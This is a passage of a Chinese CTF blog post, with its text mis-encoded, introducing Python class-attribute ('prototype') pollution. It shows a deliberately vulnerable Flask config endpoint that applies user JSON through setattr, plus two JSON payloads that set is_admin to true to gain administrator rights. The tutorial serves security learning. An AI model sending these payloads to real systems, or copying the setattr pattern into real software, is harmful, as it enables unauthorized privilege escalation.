<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="pythonåŸå‹é“¾æ±¡æŸ“ å‚è€ƒï¼šPythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python) - è·³è·³ç³–\nå°±åƒJavascriptä¸­çš„åŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¯ä»¥åœ¨Pythonä¸­å®ç°å¯¹ç±»å±æ€§å€¼çš„æ±¡æŸ“ã€‚æ±¡æŸ“åªå¯¹ç±»çš„å±æ€§èµ·ä½œç”¨ï¼Œå¯¹äºç±»æ–¹æ³•æ˜¯æ— æ•ˆçš„ã€‚\n">
<title>pythonåŸå‹é“¾æ±¡æŸ“</title>

<link rel='canonical' href='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="pythonåŸå‹é“¾æ±¡æŸ“">
<meta property='og:description' content="pythonåŸå‹é“¾æ±¡æŸ“ å‚è€ƒï¼šPythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python) - è·³è·³ç³–\nå°±åƒJavascriptä¸­çš„åŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¯ä»¥åœ¨Pythonä¸­å®ç°å¯¹ç±»å±æ€§å€¼çš„æ±¡æŸ“ã€‚æ±¡æŸ“åªå¯¹ç±»çš„å±æ€§èµ·ä½œç”¨ï¼Œå¯¹äºç±»æ–¹æ³•æ˜¯æ— æ•ˆçš„ã€‚\n">
<meta property='og:url' content='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/'>
<meta property='og:site_name' content='ç¾å’•å™œçš„å°ç«™'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='åŸå‹é“¾æ±¡æŸ“' /><meta property='article:published_time' content='2025-03-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-27T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png' />
<meta name="twitter:title" content="pythonåŸå‹é“¾æ±¡æŸ“">
<meta name="twitter:description" content="pythonåŸå‹é“¾æ±¡æŸ“ å‚è€ƒï¼šPythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python) - è·³è·³ç³–\nå°±åƒJavascriptä¸­çš„åŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¯ä»¥åœ¨Pythonä¸­å®ç°å¯¹ç±»å±æ€§å€¼çš„æ±¡æŸ“ã€‚æ±¡æŸ“åªå¯¹ç±»çš„å±æ€§èµ·ä½œç”¨ï¼Œå¯¹äºç±»æ–¹æ³•æ˜¯æ— æ•ˆçš„ã€‚\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ˜‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç¾å’•å™œçš„å°ç«™</a></h1>
            <h2 class="site-description">Cialloï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜…</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#å±é™©ä»£ç æ®µåˆå¹¶å‡½æ•°">å±é™©ä»£ç æ®µï¼ˆåˆå¹¶å‡½æ•°ï¼‰</a></li>
    <li><a href="#æ±¡æŸ“è¿‡ç¨‹åˆ†æ">æ±¡æŸ“è¿‡ç¨‹åˆ†æ</a>
      <ol>
        <li><a href="#æ— æ³•æ±¡æŸ“çš„object">æ— æ³•æ±¡æŸ“çš„<code>Object</code></a></li>
      </ol>
    </li>
    <li><a href="#åˆ©ç”¨">åˆ©ç”¨</a>
      <ol>
        <li><a href="#å…¨å±€å˜é‡è·å–">å…¨å±€å˜é‡è·å–</a></li>
        <li><a href="#å·²åŠ è½½æ¨¡å—è·å–">å·²åŠ è½½æ¨¡å—è·å–</a>
          <ol>
            <li><a href="#importåŠ è½½è·å–">importåŠ è½½è·å–</a></li>
            <li><a href="#sysæ¨¡å—åŠ è½½è·å–">sysæ¨¡å—åŠ è½½è·å–</a></li>
            <li><a href="#åŠ è½½å™¨loaderè·å–">åŠ è½½å™¨loaderè·å–</a></li>
            <li><a href="#å®é™…ç¯å¢ƒä¸­çš„åˆå¹¶å‡½æ•°">å®é™…ç¯å¢ƒä¸­çš„åˆå¹¶å‡½æ•°</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#æ”»å‡»é¢æ‹“å±•">æ”»å‡»é¢æ‹“å±•</a>
      <ol>
        <li><a href="#å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢">å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢</a>
          <ol>
            <li><a href="#__defaults__"><code>__defaults__</code></a></li>
            <li><a href="#__kwdefaults__"><code>__kwdefaults__</code></a></li>
          </ol>
        </li>
        <li><a href="#ç‰¹å®šå€¼æ›¿æ¢">ç‰¹å®šå€¼æ›¿æ¢</a>
          <ol>
            <li><a href="#osenvironèµ‹å€¼"><code>os.environ</code>èµ‹å€¼</a></li>
            <li><a href="#flaskç›¸å…³å±æ€§"><code>flask</code>ç›¸å…³å±æ€§</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#jinjaè¯­æ³•æ ‡è¯†ç¬¦">Jinjaè¯­æ³•æ ‡è¯†ç¬¦</a></li>
    <li><a href="#jinjaè¯­æ³•å…¨å±€æ•°æ®">jinjaè¯­æ³•å…¨å±€æ•°æ®</a>
      <ol>
        <li><a href="#æ¨¡æ¿ç¼–è¯‘æ—¶çš„å˜é‡">æ¨¡æ¿ç¼–è¯‘æ—¶çš„å˜é‡</a></li>
      </ol>
    </li>
    <li><a href="#ä¾‹é¢˜">ä¾‹é¢˜</a>
      <ol>
        <li><a href="#dasctf-2023--0x401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›ezflask">[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]EzFlask</a></li>
        <li><a href="#ciscn2024-åˆèµ›-sanic">[Ciscn2024 åˆèµ›] sanic</a></li>
        <li><a href="#dasctf-2024æš‘æœŸæŒ‘æˆ˜èµ›ä¸ºçƒ­çˆ±å¹¶è‚©ä½œæˆ˜sanics-revenge">[DASCTF 2024æš‘æœŸæŒ‘æˆ˜èµ›ï½œä¸ºçƒ­çˆ±ï¼Œå¹¶è‚©ä½œæˆ˜]Sanic&rsquo;s revenge</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
                <img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png"
                        
                        width="928" 
                        height="1232" 
                        loading="lazy"
                        alt="Featured image of post pythonåŸå‹é“¾æ±¡æŸ“" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/python/" style="background-color: #2a9d8f; color: #fff;">
                Python
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">pythonåŸå‹é“¾æ±¡æŸ“</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 27, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 27 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="pythonåŸå‹é“¾æ±¡æŸ“">pythonåŸå‹é“¾æ±¡æŸ“
</h1><p>å‚è€ƒï¼š<a class="link" href="https://tttang.com/archive/1876/"  target="_blank" rel="noopener"
    >PythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python) - è·³è·³ç³–</a></p>
<p>å°±åƒ<code>Javascript</code>ä¸­çš„åŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¯ä»¥åœ¨<code>Python</code>ä¸­å®ç°å¯¹ç±»å±æ€§å€¼çš„æ±¡æŸ“ã€‚æ±¡æŸ“åªå¯¹ç±»çš„å±æ€§èµ·ä½œç”¨ï¼Œå¯¹äºç±»æ–¹æ³•æ˜¯æ— æ•ˆçš„ã€‚</p>
<p>è¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹pythonç±»å’Œå®ä¾‹çš„å…³ç³»</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Animal</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">species</span> <span class="o">=</span> <span class="s2">&#34;åŠ¨ç‰©&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">make_sound</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2"> å‘å‡ºå£°éŸ³&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œï¼Œ<code>Animal</code> æ˜¯ä¸€ä¸ªç±»ï¼Œ<code>species</code> æ˜¯ç±»å˜é‡ï¼Œ<code>name</code> æ˜¯å®ä¾‹å˜é‡ã€‚åˆ›å»ºå¤šä¸ª<code>Animal</code>å®ä¾‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">dog</span> <span class="o">=</span> <span class="n">Animal</span><span class="p">(</span><span class="s2">&#34;ç‹—&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">=</span> <span class="n">Animal</span><span class="p">(</span><span class="s2">&#34;çŒ«&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dog</span><span class="o">.</span><span class="n">make_sound</span><span class="p">()</span>  <span class="c1"># è¾“å‡º: ç‹— å‘å‡ºå£°éŸ³</span>
</span></span><span class="line"><span class="cl"><span class="n">cat</span><span class="o">.</span><span class="n">make_sound</span><span class="p">()</span>  <span class="c1"># è¾“å‡º: çŒ« å‘å‡ºå£°éŸ³</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">dog</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># è¾“å‡º: åŠ¨ç‰©</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">cat</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># è¾“å‡º: åŠ¨ç‰©</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨Pythonä¸­ï¼Œç±»å˜é‡æ˜¯æ‰€æœ‰å®ä¾‹å…±äº«çš„ã€‚å¦‚æœæˆ‘ä»¬ä¿®æ”¹ç±»å˜é‡ï¼Œæ‰€æœ‰å®ä¾‹éƒ½ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»ä¼¼äºJavaScriptä¸­ä¿®æ”¹åŸå‹é“¾ï¼Œå½±å“æ‰€æœ‰ç»§æ‰¿è‡ªè¯¥åŸå‹çš„å¯¹è±¡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Animal</span><span class="o">.</span><span class="n">species</span> <span class="o">=</span> <span class="s2">&#34;å“ºä¹³åŠ¨ç‰©&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">dog</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># è¾“å‡º: å“ºä¹³åŠ¨ç‰©</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">cat</span><span class="o">.</span><span class="n">species</span><span class="p">)</span>  <span class="c1"># è¾“å‡º: å“ºä¹³åŠ¨ç‰©</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¢ä¸ªæ€è·¯è¦æ˜¯è¿™é‡Œçš„Animalç±»å˜æˆConfigæ—¶ï¼Œç„¶åè¿™ä¸ªå±æ€§å˜æˆis_adminæ—¶ï¼Œå°±èƒ½æ±¡æŸ“ï¼ŒæŠŠè‡ªå·±å˜æˆç®¡ç†å‘˜äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># config.py</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Config</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_admin</span> <span class="o">=</span> <span class="kc">False</span>  <span class="c1"># é»˜è®¤ç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">set_config</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">setattr</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get_config</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨è¿™æ ·çš„ä¸€ä¸ªåç«¯ä»£ç ä¸­,å°±ä¼šå­˜åœ¨è¿™ç§åŸå‹é“¾æ±¡æŸ“:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">Config</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/update_config&#39;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">update_config</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">Config</span><span class="o">.</span><span class="n">set_config</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;config&#34;</span><span class="p">:</span> <span class="n">data</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/check_admin&#39;</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">span</span><span class="o">&gt;</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_admin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_admin</span> <span class="o">=</span> <span class="n">Config</span><span class="o">.</span><span class="n">get_config</span><span class="p">(</span><span class="s1">&#39;is_admin&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;is_admin&#34;</span><span class="p">:</span> <span class="n">is_admin</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¦‚æœæˆ‘ä»¬è¿™æ ·è®¾ç½®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /update_config
</span></span><span class="line"><span class="cl">Content-Type: application/json
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;is_admin&#34;: true
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°±å¯ä»¥æŠŠè‡ªå·±å˜æˆç®¡ç†å‘˜äº†</p>
<p>ä¸ä»…å¦‚æ­¤ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥å°è¯•ä¿®æ”¹å…¶ä»–å…³é”®å±æ€§æˆ–åµŒå¥—å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /update_config
</span></span><span class="line"><span class="cl">Content-Type: application/json
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;: {
</span></span><span class="line"><span class="cl">        &#34;is_admin&#34;: true
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
